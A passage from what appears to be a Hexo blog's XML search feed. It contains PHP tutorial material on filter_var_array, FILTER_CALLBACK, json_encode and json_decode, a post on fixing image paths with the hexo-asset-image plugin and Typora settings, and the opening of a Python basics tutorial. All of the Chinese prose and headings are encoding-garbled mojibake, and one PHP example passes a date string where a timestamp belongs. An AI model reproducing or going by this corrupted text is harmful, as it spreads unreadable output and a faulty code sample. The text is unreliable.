href="#è¿‡æ»¤å¤šä¸ªè¾“å…¥ï¼šfilter-var-array-æˆ–-the-filter-input-array">ğŸ­</a>è¿‡æ»¤å¤šä¸ªè¾“å…¥ï¼šfilter_var_array æˆ– the filter_input_array</h4><p>filter_input_array() å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯æ•°ç»„æˆ–å•ä¸€è¿‡æ»¤å™¨çš„ IDã€‚</p><p>å¦‚æœè¯¥å‚æ•°æ˜¯å•ä¸€è¿‡æ»¤å™¨çš„ IDï¼Œé‚£è¿™ä¸ªæŒ‡å®šçš„è¿‡æ»¤å™¨ä¼šè¿‡æ»¤è¾“å…¥æ•°ç»„ä¸­æ‰€æœ‰çš„å€¼ã€‚</p><p>å¦‚æœè¯¥å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ­¤æ•°ç»„å¿…é¡»éµå¾ªä¸‹é¢çš„è§„åˆ™ï¼š</p><ul><li>å¿…é¡»æ˜¯ä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«çš„è¾“å…¥å˜é‡æ˜¯æ•°ç»„çš„é”®</li><li>æ­¤æ•°ç»„çš„å€¼å¿…é¡»æ˜¯è¿‡æ»¤å™¨çš„ ID ï¼Œæˆ–è€…æ˜¯è§„å®šäº†è¿‡æ»¤å™¨ã€æ ‡å¿—å’Œé€‰é¡¹çš„æ•°ç»„</li></ul><h4 id="Filter-Callback"><a class="header-anchor" href="#Filter-Callback">ğŸ­</a>Filter Callback</h4><p>è°ƒç”¨è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå°†å‡†å¤‡ç”¨åˆ°çš„è¿‡æ»¤å™¨çš„å‡½æ•°ï¼ŒæŒ‰æŒ‡å®šé€‰é¡¹çš„è§„å®šæ–¹æ³•è¿›è¡Œè§„å®šï¼›åœ¨å…³è”æ•°ç»„ä¸­ï¼Œå¸¦æœ‰åç§° â€œoptionsâ€ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convertSpace</span>(<span class="hljs-params">$string</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, $string);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæŠŠ &quot;_&quot; æ›¿æ¢ä¸º &quot;.&quot; çš„å‡½æ•°</span>&#125; $string = <span class="hljs-string">&quot;black_pink!&quot;</span>; <span class="hljs-keyword">echo</span> filter_var($string, FILTER_CALLBACK,<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;options&quot;</span>=&gt;<span class="hljs-string">&quot;convertSpace&quot;</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºï¼šblack.pink!</p><h2 id="PHP-JSON"><a class="header-anchor" href="#PHP-JSON">ğŸ­</a>PHP JSON</h2><h4 id="json-encodeï¼šç”¨äºå¯¹å˜é‡è¿›è¡Œ-JSON-ç¼–ç "><a class="header-anchor" href="#json-encodeï¼šç”¨äºå¯¹å˜é‡è¿›è¡Œ-JSON-ç¼–ç ">ğŸ­</a>json_encodeï¼šç”¨äºå¯¹å˜é‡è¿›è¡Œ JSON ç¼–ç </h4><pre><code class="hljs autoit"><span class="hljs-built_in">string</span> json_encode ( $value [, $options = <span class="hljs-number">0</span> ] )</code></pre><p>å®ä¾‹ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   $arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-number">5</span>);   <span class="hljs-keyword">echo</span> json_encode($arr);<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºï¼š{â€œaâ€:1,â€œbâ€:2,â€œcâ€:3,â€œdâ€:4,â€œeâ€:5}</p><h4 id="å°†-PHP-å¯¹è±¡è½¬æ¢ä¸º-JSON-æ ¼å¼æ•°æ®"><a class="header-anchor" href="#å°†-PHP-å¯¹è±¡è½¬æ¢ä¸º-JSON-æ ¼å¼æ•°æ®">ğŸ­</a>å°† PHP å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼æ•°æ®</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Emp</span> </span>&#123;       <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;       <span class="hljs-keyword">public</span> $hobbies  = <span class="hljs-string">&quot;&quot;</span>;       <span class="hljs-keyword">public</span> $birthdate = <span class="hljs-string">&quot;&quot;</span>;   &#125;   $e = <span class="hljs-keyword">new</span> Emp();   $e-&gt;name = <span class="hljs-string">&quot;yuting&quot;</span>;   $e-&gt;hobbies  = <span class="hljs-string">&quot;travel&quot;</span>;   $e-&gt;birthdate = date(<span class="hljs-string">&#x27;m/d/Y h:i:s a&#x27;</span>, <span class="hljs-string">&quot;9/16/2002 8:30:03 a&quot;</span>);   $e-&gt;birthdate = date(<span class="hljs-string">&#x27;m/d/Y h:i:s a&#x27;</span>, strtotime(<span class="hljs-string">&quot;9/16/2002 8:30:03&quot;</span>));   <span class="hljs-keyword">echo</span> json_encode($e);<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºï¼š{â€œnameâ€:â€œyutingâ€,â€œhobbiesâ€:â€œtravelâ€,â€œbirthdateâ€:â€œ09/16/2002 8:30:03 amâ€}</p><h4 id="json-decode"><a class="header-anchor" href="#json-decode">ğŸ­</a>json_decode</h4><p>ç”¨äºå¯¹ JSON æ ¼å¼çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œå¹¶è½¬æ¢ä¸º PHP å˜é‡ã€‚</p><pre><code class="hljs nginx"><span class="hljs-attribute">mixed</span> json_decode (<span class="hljs-variable">$json_string</span> [,<span class="hljs-variable">$assoc</span> = <span class="hljs-literal">false</span> [, <span class="hljs-variable">$depth</span> = <span class="hljs-number">512</span> [, <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span> ]]])</code></pre><ul><li><strong>json_string</strong>: å¾…è§£ç çš„ JSON å­—ç¬¦ä¸²ï¼Œå¿…é¡»æ˜¯ UTF-8 ç¼–ç æ•°æ®</li><li><strong>assoc</strong>: å½“è¯¥å‚æ•°ä¸º TRUE æ—¶ï¼Œå°†è¿”å›æ•°ç»„ï¼ŒFALSE æ—¶è¿”å›å¯¹è±¡ã€‚</li><li><strong>depth</strong>: æ•´æ•°ç±»å‹çš„å‚æ•°ï¼Œå®ƒæŒ‡å®šé€’å½’æ·±åº¦</li><li><strong>options</strong>: äºŒè¿›åˆ¶æ©ç ï¼Œç›®å‰åªæ”¯æŒ JSON_BIGINT_AS_STRING ã€‚</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdownä¸Šä¼ åšå®¢æ–‡ç« çš„å›¾ç‰‡æ˜¾ç¤ºåŠç›®å½•ç”Ÿæˆé—®é¢˜</title>
    <link href="/2020/10/27/problem/"/>
    <url>/2020/10/27/problem/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E5%9B%BE%E7%89%87">å›¾ç‰‡</a><ul><li><a href="#%E6%B3%95%E4%B8%80">æ³•ä¸€ï¼š</a><ul><li><a href="#%E4%B8%80%E8%A3%85%E6%8F%92%E4%BB%B6">ä¸€ã€è£…æ’ä»¶</a></li><li><a href="#%E4%BA%8C%E6%94%B9%E8%AE%BE%E7%BD%AE">äºŒã€æ”¹è®¾ç½®</a><ul><li><a href="#1typora%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE">1ã€Typoraçš„å›¾ç‰‡æ ¹ç›®å½•è®¾ç½®</a></li><li><a href="#2typora%E8%AE%BE%E7%BD%AE%E5%9B%BE%E7%89%87%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84">2ã€Typoraè®¾ç½®å›¾ç‰‡çš„ç›¸å¯¹è·¯å¾„</a></li><li><a href="#3typora%E8%87%AA%E5%8A%A8%E5%A4%8D%E5%88%B6%E5%9B%BE%E7%89%87%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B">3ã€Typoraè‡ªåŠ¨å¤åˆ¶å›¾ç‰‡åˆ°æŒ‡å®šç›®å½•ä¸‹</a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E9%80%82%E7%94%A8%E4%BA%8Emac">æ³•äºŒï¼š(é€‚ç”¨äºmac)</a></li></ul></li><li><a href="#%E7%9B%AE%E5%BD%95">ç›®å½•</a></li><li><a href="#%E5%B0%BE%E8%AE%B0">å°¾è®°</a></li></ul><p>åˆšå‘è¡¨ç¬¬ä¸€ç¯‡åšå®¢æ–‡ç« æ—¶ï¼Œå‘ç°åœ¨typoraé‡Œå†™çš„å¸¦æœ‰å›¾ç‰‡åŠç›®å½•çš„æ–‡ç« æ›´åˆ°åšå®¢é‡Œå›¾ç‰‡ä¸ç›®å½•å°±æ— æ³•æ˜¾ç¤ºï¼›ä¸ºæ­¤æ‰¾äº†è®¸å¤šæ–¹æ³•ï¼Œæ€»ç»“å¦‚ä¸‹ï¼š</p><p>åŸå› :ç”±äºä¸Šä¼ çš„å›¾ç‰‡ä½¿ç”¨çš„æ˜¯ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„ï¼Œæ¯æ¬¡æ’å…¥æˆªå›¾çš„å›¾ç‰‡æ—¶ï¼Œé»˜è®¤éƒ½æ˜¯å°†å›¾ç‰‡å­˜åœ¨Cç›˜ä¸­ï¼Œå½“MDæ–‡ä»¶ç§»åŠ¨æ—¶ï¼Œå›¾ç‰‡çš„é“¾æ¥å°±ä¼šå¤±æ•ˆï¼Œå°±ä¼šå‡ºç°å›¾ç‰‡åŠ è½½å¤±è´¥çš„é—®é¢˜ã€‚</p><h2 id="å›¾ç‰‡"><a class="header-anchor" href="#å›¾ç‰‡">ğŸ­</a>å›¾ç‰‡</h2><h3 id="æ³•ä¸€ï¼š"><a class="header-anchor" href="#æ³•ä¸€ï¼š">ğŸ­</a>æ³•ä¸€ï¼š</h3><h4 id="ä¸€ã€è£…æ’ä»¶"><a class="header-anchor" href="#ä¸€ã€è£…æ’ä»¶">ğŸ­</a>ä¸€ã€è£…æ’ä»¶</h4><p>æˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ä¸ªå›¾ç‰‡è·¯å¾„è½¬æ¢çš„æ’ä»¶ï¼š</p><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CodeFalling/</span>hexo-asset-image --save</code></pre><p>æ’ä»¶çš„å†…å®¹éœ€è¦ä¿®æ”¹:</p><p>æ‰“å¼€/node_modules/hexo-asset-image/index.jsï¼Œå°†å†…å®¹æ›´æ¢ä¸ºä¸‹é¢çš„ä»£ç ã€‚</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<span class="hljs-keyword">var</span> cheerio = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cheerio&#x27;</span>);<span class="hljs-comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPosition</span>(<span class="hljs-params">str, m, i</span>) </span>&#123;  <span class="hljs-keyword">return</span> str.split(m, i).join(m).length;&#125;<span class="hljs-keyword">var</span> version = <span class="hljs-built_in">String</span>(hexo.version).split(<span class="hljs-string">&#x27;.&#x27;</span>);hexo.extend.filter.register(<span class="hljs-string">&#x27;after_post_render&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;  <span class="hljs-keyword">var</span> config = hexo.config;  <span class="hljs-keyword">if</span>(config.post_asset_folder)&#123;    <span class="hljs-keyword">var</span> link = data.permalink;<span class="hljs-keyword">if</span>(version.length &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">Number</span>(version[<span class="hljs-number">0</span>]) == <span class="hljs-number">3</span>)   <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<span class="hljs-keyword">else</span>   <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>;<span class="hljs-comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span><span class="hljs-keyword">var</span> endPos = link.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-number">1</span>;    link = link.substring(beginPos, endPos);    <span class="hljs-keyword">var</span> toprocess = [<span class="hljs-string">&#x27;excerpt&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;content&#x27;</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; toprocess.length; i++)&#123;      <span class="hljs-keyword">var</span> key = toprocess[i];       <span class="hljs-keyword">var</span> $ = cheerio.load(data[key], &#123;        ignoreWhitespace: <span class="hljs-literal">false</span>,        xmlMode: <span class="hljs-literal">false</span>,        lowerCaseTags: <span class="hljs-literal">false</span>,        decodeEntities: <span class="hljs-literal">false</span>      &#125;);      $(<span class="hljs-string">&#x27;img&#x27;</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> ($(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>))&#123;<span class="hljs-comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span><span class="hljs-keyword">var</span> src = $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;   !<span class="hljs-regexp">/^\s*\//</span>.test(src)) &#123;  <span class="hljs-comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span>  <span class="hljs-comment">// In addition, to support multi-level local directory.</span>  <span class="hljs-keyword">var</span> linkArray = link.split(<span class="hljs-string">&#x27;/&#x27;</span>).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>)</span>&#123;<span class="hljs-keyword">return</span> elem != <span class="hljs-string">&#x27;&#x27;</span>;  &#125;);  <span class="hljs-keyword">var</span> srcArray = src.split(<span class="hljs-string">&#x27;/&#x27;</span>).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>)</span>&#123;<span class="hljs-keyword">return</span> elem != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="hljs-string">&#x27;.&#x27;</span>;  &#125;);  <span class="hljs-keyword">if</span>(srcArray.length &gt; <span class="hljs-number">1</span>)srcArray.shift();  src = srcArray.join(<span class="hljs-string">&#x27;/&#x27;</span>);  $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>, config.root + link + src);  <span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info(<span class="hljs-string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info(<span class="hljs-string">&quot;no src attr, skipped...&quot;</span>);<span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info($(<span class="hljs-built_in">this</span>));&#125;      &#125;);      data[key] = $.html();    &#125;  &#125;&#125;);</code></pre><p>æ“ä½œå®Œæˆåï¼Œæ¯æ¬¡ç”¨hexo  new XXX åˆ›å»ºæ–°æ–‡ç« æ—¶åˆ—è¡¨ä¼šå¤šå‡ºä¸€ä¸ªä¸æ–‡ç« åŒåçš„æ–‡ä»¶å¤¹ï¼š</p><p><img src="/2020/10/27/problem/1.jpg" alt="1"></p><p>æ¥ä¸‹æ¥æ‰“å¼€_config.ymlæ–‡ä»¶ï¼Œä¿®æ”¹ä¸‹è¿°å†…å®¹ï¼Œå°†falseæ”¹æˆtrueã€‚</p><pre><code class="hljs yaml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span></code></pre><p>å°†æ–‡ç« éœ€è¦ç”¨åˆ°çš„å›¾ç‰‡å­˜å…¥åŒåæ–‡ä»¶å¤¹ä¸­ï¼Œä½†ä»…ä»…è¿™æ ·è¿˜æ˜¯æ— æ³•æ˜¾ç¤ºå›¾ç‰‡ã€‚</p><h4 id="äºŒã€æ”¹è®¾ç½®"><a class="header-anchor" href="#äºŒã€æ”¹è®¾ç½®">ğŸ­</a>äºŒã€æ”¹è®¾ç½®</h4><h5 id="1ã€Typoraçš„å›¾ç‰‡æ ¹ç›®å½•è®¾ç½®"><a class="header-anchor" href="#1ã€Typoraçš„å›¾ç‰‡æ ¹ç›®å½•è®¾ç½®">ğŸ­</a>1ã€Typoraçš„å›¾ç‰‡æ ¹ç›®å½•è®¾ç½®</h5><p>ç‚¹å‡» æ–‡ä»¶â€”åå¥½è®¾ç½®â€”å›¾åƒ</p><p>é»˜è®¤æ˜¯â€œæ— ç‰¹æ®Šæ“ä½œâ€,æ›´æ”¹ä¸ºâ€œå¤åˆ¶å›¾ç‰‡åˆ°./${filename}.assetsæ–‡ä»¶å¤¹â€</p><h5 id="2ã€Typoraè®¾ç½®å›¾ç‰‡çš„ç›¸å¯¹è·¯å¾„"><a class="header-anchor" href="#2ã€Typoraè®¾ç½®å›¾ç‰‡çš„ç›¸å¯¹è·¯å¾„">ğŸ­</a>2ã€Typoraè®¾ç½®å›¾ç‰‡çš„ç›¸å¯¹è·¯å¾„</h5><p>å‹¾é€‰ä¸‹é¢ä¸¤é¡¹â€œå¯¹æœ¬åœ°ä½ç½®çš„å›¾ç‰‡åº”ç”¨ä¸Šè¿°è§„åˆ™â€å’Œâ€œä¼˜å…ˆä½¿ç”¨ç›¸å¯¹è·¯å¾„â€ã€‚</p><p><img src="/2020/10/27/problem/2.jpg" alt="2"></p><p>æ›´æ”¹è®¾ç½®åæ¯æ¬¡åœ¨æ–°å»ºä¸€ä¸ªmdæ–‡ä»¶æ—¶ï¼Œåœ¨mdæ–‡æ¡£æ‰€åœ¨æ–‡ä»¶å¤¹ä¸­å°±ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸è¯¥æ–‡ä»¶åŒåçš„.assetsçš„æ–‡ä»¶å¤¹ï¼Œå¤åˆ¶çš„å›¾ç‰‡ä¹Ÿä¼šè‡ªåŠ¨ä¿å­˜åˆ°å…¶ä¸­ã€‚</p><p><img src="/2020/10/27/problem/3.jpg" alt="3"></p><h5 id="3ã€Typoraè‡ªåŠ¨å¤åˆ¶å›¾ç‰‡åˆ°æŒ‡å®šç›®å½•ä¸‹"><a class="header-anchor" href="#3ã€Typoraè‡ªåŠ¨å¤åˆ¶å›¾ç‰‡åˆ°æŒ‡å®šç›®å½•ä¸‹">ğŸ­</a>3ã€Typoraè‡ªåŠ¨å¤åˆ¶å›¾ç‰‡åˆ°æŒ‡å®šç›®å½•ä¸‹</h5><p><img src="/2020/10/27/problem/4.jpg" alt="4"></p><p>ä¹‹åçš„å›¾ç‰‡è·¯å¾„ä¼šå˜æˆç±»ä¼¼å¦‚ä¸‹:</p><pre><code class="hljs markdown">![<span class="hljs-string">é»‘å®¢</span>](<span class="hljs-link">Cyber.assets/é»‘å®¢.jpg</span>)</code></pre><h3 id="æ³•äºŒï¼š-é€‚ç”¨äºmac"><a class="header-anchor" href="#æ³•äºŒï¼š-é€‚ç”¨äºmac">ğŸ­</a>æ³•äºŒï¼š(é€‚ç”¨äºmac)</h3><ol><li>ä¸æ³•ä¸€ç±»ä¼¼ï¼Œåœ¨æ”¹è®¾ç½®çš„æ­¥éª¤ä¸€æ—¶å¤šå‹¾ä¸Šç¬¬å››æ¡ï¼šå…è®¸æ ¹æ®YMLè®¾ç½®è‡ªåŠ¨ä¸ŠåºŠå›¾ç‰‡ã€‚</li><li>éœ€å†å®‰è£…å›¾åºŠåº”ç”¨ iPicã€‚</li><li>åœ¨æ”¹è®¾ç½®çš„ç¬¬ä¸‰æ­¥éª¤æ—¶å‹¾é€‰å¦‚ä¸‹:</li></ol><p><img src="/2020/10/27/problem/5.jpg" alt="5"></p><h2 id="ç›®å½•"><a class="header-anchor" href="#ç›®å½•">ğŸ­</a>ç›®å½•</h2><p>markdownå¯ä»¥ä½¿ç”¨<code>[TOC]</code>æ¥è‡ªåŠ¨ç”Ÿæˆmarkdownæ–‡ä»¶çš„æ ‡é¢˜ç›®å½•ï¼Œä½†æ˜¯githubå´ä¸æ”¯æŒ<code>[TOC]</code>æ ‡ç­¾ã€‚ä»¥ä¸‹é’ˆå¯¹vscodeï¼Œå®‰è£…äº†Markdown All in Oneæ’ä»¶ã€‚ä¸‹è½½åœ°å€ï¼š<a href="https://www.vsixhub.com/vsix/1925/%E3%80%82%E7%84%B6%E5%90%8E%E5%AF%B9%E4%BA%8E%E4%BD%A0%E8%A6%81%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E7%9A%84md%E6%96%87%E4%BB%B6%EF%BC%8Cvscode%E5%BF%AB%E6%8D%B7%E9%94%AE">https://www.vsixhub.com/vsix/1925/ã€‚ç„¶åå¯¹äºä½ è¦ç”Ÿæˆç›®å½•çš„mdæ–‡ä»¶ï¼Œvscodeå¿«æ·é”®</a> ctrl + shift + p æ‰“å¼€å¦‚ä¸‹</p><p><img src="/2020/10/27/problem/6.jpg" alt="6"></p><p>é€‰æ‹©<code> create table of contents</code> å›è½¦å³å¯ç”Ÿæˆç›®å½•ã€‚</p><h2 id="å°¾è®°"><a class="header-anchor" href="#å°¾è®°">ğŸ­</a>å°¾è®°</h2><p>æœ€å¼€å§‹å›¾ç‰‡æ˜¾ç¤ºä¸äº†çš„æ—¶å€™ç‰¹åˆ«éš¾å—ï¼Œå°¤å…¶ç¬¬ä¸€ç¯‡æ–‡ç« Markdownä¸­å›¾ç‰‡å¾ˆå¤šï¼›å½“æ—¶ä¸Šç™¾åº¦çŸ¥ä¹ä¹‹ç±»çš„æ²¡æœ‰æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼ˆæœ‰çš„å°±åªæœ‰ä¸€åŠï¼Œæœ‰çš„æ ¹æœ¬ä¸è¡Œ ),åæ¥æç½®äº†ï¼Œé¶åœºçš„ç¯å¢ƒå»ºå®Œåï¼Œåˆç»•å›æ¥çº ç»“è¿™ä¸ªé—®é¢˜ï¼Œç»ˆäºæ‰¾åˆ°æ­£è§£äº†ï¼Œå¹³å¹³æ— å¥‡å°å¤©æ‰~~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python(ä¸€)</title>
    <link href="/2020/10/24/python/"/>
    <url>/2020/10/24/python/</url>
    
    <content type="html"><![CDATA[<h1>Python</h1><p>åœ¨ä¸€äº›æ•™ç¨‹ä¸­ï¼Œåœ¨Pythonæ–‡ä»¶çš„è¡Œé¦–ä¼šå†™ä¸Š<code>#!/usr/bin/python3</code>å®ƒçš„ä½œç”¨æ˜¯ç”¨æ¥æŒ‡å®šPythonçš„è§£é‡Šå™¨ï¼Œå¹¶ç”¨åªèƒ½åº”ç”¨äºLinuxã€Macç­‰ç³»ç»Ÿä¸­ï¼ŒWindowsç³»ç»Ÿä¼šå¿½ç•¥è¿™ä¸ªæ³¨é‡Šã€‚æ•ˆæœç­‰åŒäº<code>#!/usr/bin/env python3</code>å…¶ä½œç”¨å°±æ˜¯è®©envå»æŸ¥æ‰¾python3çš„ç»å¯¹è·¯å¾„æ›¿æ¢ä½œä¸ºè§£é‡Šå™¨è·¯å¾„ã€‚</p><p><a href="#python">Python</a></p><ul><li><a href="#python%E8%A7%A3%E9%87%8A%E5%99%A8">Pythonè§£é‡Šå™¨</a><ul><li><a href="#%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%BC%96%E7%A8%8B">äº¤äº’å¼ç¼–ç¨‹</a></li><li><a href="#%E8%84%9A%E6%9C%AC%E5%BC%8F%E7%BC%96%E7%A8%8B">è„šæœ¬å¼ç¼–ç¨‹</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">åŸºæœ¬æ•°æ®ç±»å‹</a><ul><li><a href="#%E5%A4%9A%E4%B8%AA%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC">å¤šä¸ªå˜é‡èµ‹å€¼</a></li></ul></li><li><a href="#%E6%A0%87%E5%87%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">æ ‡å‡†æ•°æ®ç±»å‹</a><ul><li><a href="#number">Number</a></li><li><a href="#string">String</a></li><li><a href="#list">List</a></li><li><a href="#tuple">Tuple</a></li><li><a href="#set">Set</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0">æ·»åŠ å…ƒç´ </a></li><li><a href="#%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0">ç§»é™¤å…ƒç´ </a></li><li><a href="#%E6%B8%85%E7%A9%BA%E9%9B%86%E5%90%88">æ¸…ç©ºé›†åˆ</a></li><li><a href="#%E6%97%A0%E9%99%90%E6%9E%81%E5%B5%8C%E5%A5%97">æ— é™æåµŒå¥—</a></li></ul></li><li><a href="#python-%E8%BF%90%E7%AE%97%E7%AC%A6">Python è¿ç®—ç¬¦</a><ul><li><a href="#%E6%88%90%E5%91%98%E8%BF%90%E7%AE%97%E7%AC%A6">æˆå‘˜è¿ç®—ç¬¦</a></li><li><a href="#%E8%BA%AB%E4%BB%BD%E8%BF%90%E7%AE%97%E7%AC%A6">èº«ä»½è¿ç®—ç¬¦</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">è¿ç®—ç¬¦ä¼˜å…ˆçº§</a></li></ul></li><li><a href="#%E6%95%B0%E5%AD%97">æ•°å­—</a><ul><li><a href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">æ•°å­—ç±»å‹è½¬æ¢</a></li><li><a href="#round%E6%B5%AE%E7%82%B9%E6%95%B0%E5%AD%98%E5%82%A8%E6%9C%89%E7%82%B9%E5%A5%87%E6%80%AA">roundï¼ˆæµ®ç‚¹æ•°å­˜å‚¨æœ‰ç‚¹å¥‡æ€ªï¼‰</a></li><li><a href="#-%E5%92%8C--%E7%9A%84%E4%B8%8D%E5%90%8C"><strong>+=</strong> å’Œ <strong>=+</strong> çš„ä¸åŒ</a></li></ul></li><li><a href="#python-%E5%AD%97%E7%AC%A6%E4%B8%B2">Python å­—ç¬¦ä¸²</a><ul><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%B4%E6%96%B0">å­—ç¬¦ä¸²æ›´æ–°</a></li><li><a href="#%E4%B8%89%E5%BC%95%E5%8F%B7">ä¸‰å¼•å·</a></li></ul></li></ul><h2 id="Pythonè§£é‡Šå™¨"><a class="header-anchor" href="#Pythonè§£é‡Šå™¨">ğŸ­</a>Pythonè§£é‡Šå™¨</h2><h4 id="äº¤äº’å¼ç¼–ç¨‹"><a class="header-anchor" href="#äº¤äº’å¼ç¼–ç¨‹">ğŸ­</a>äº¤äº’å¼ç¼–ç¨‹</h4><p>éœ€è¦æ‰“å¼€ cmd çª—å£ï¼ˆå‘½ä»¤æç¤ºç¬¦çª—å£ï¼‰ï¼Œåœ¨çª—å£ä¸­é”®å…¥<code>python</code>,å›è½¦ï¼Œè¿›å…¥äº†äº¤äº’å¼ç¼–ç¨‹ï¼Œæ­¤æ—¶æˆ‘ä»¬ç›´æ¥è¾“å…¥ python è¯­å¥ï¼Œå°±å¯ä»¥å¾—åˆ°è¿è¡Œçš„ç»“æœã€‚</p><h4 id="è„šæœ¬å¼ç¼–ç¨‹"><a class="header-anchor" href="#è„šæœ¬å¼ç¼–ç¨‹">ğŸ­</a>è„šæœ¬å¼ç¼–ç¨‹</h4><p>å…ˆæŠŠ python è¯­å¥å†™å¥½ï¼Œä¿å­˜åœ¨åç¼€ä¸º .py çš„æ–‡ä»¶é‡Œï¼Œç„¶åä»å¤–éƒ¨è°ƒç”¨è¿™ä¸ªæ–‡ä»¶ã€‚å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨ cmd çª—å£è¿›è¡Œè°ƒç”¨ï¼Œ<strong>ä¸äº¤äº’å¼ç¼–ç¨‹ä¸åŒçš„æ˜¯ï¼Œä¸èƒ½åœ¨cmdçª—å£å†…è¾“å…¥pythonåŠ å›è½¦æ¥è¿›å…¥äº¤äº’æ¨¡å¼</strong>ã€‚</p><h2 id="åŸºæœ¬æ•°æ®ç±»å‹"><a class="header-anchor" 